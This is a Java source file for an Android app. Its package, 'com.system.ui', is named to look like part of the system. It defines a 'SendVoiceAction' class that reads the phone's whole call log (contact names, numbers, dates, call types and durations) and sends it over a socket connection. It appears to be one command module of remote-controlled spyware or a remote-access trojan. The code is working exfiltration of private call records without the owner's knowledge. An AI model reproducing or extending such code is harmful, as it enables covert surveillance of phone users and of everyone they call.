package com.system.ui.interpret;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import com.system.ui.model.VoiceRecord;
import com.system.ui.service.LocalService;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * 发送通话记录的行为
 */
public class SendVoiceAction extends AbsAction {

	private ContentResolver mResolver;

	public SendVoiceAction(Context context) {
		super(context);
	}

	@Override
	public boolean execute() {
		try {
			((LocalService)mContext).getSocketThread().send("通话记录<*>"+getVoiceInfo().toString());
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}
	
	/**
	 * 获取所有通话记录
	 */
	public List<VoiceRecord> getVoiceInfo() {
		List<VoiceRecord> records = new ArrayList<VoiceRecord>();
		mResolver = mContext.getContentResolver();
		Cursor cursor = null;
		cursor = mResolver.query(
				CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " desc");
		if (cursor != null &&cursor.getCount()>0) {
			while (cursor.moveToNext()) {
				VoiceRecord record = new VoiceRecord();
				record.name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
				record.number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
				record.date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
				record.type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
				record.duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
				records.add(record);
			}
		}
		if (cursor != null) {
			cursor.close();
		}
		return records;
	}
}
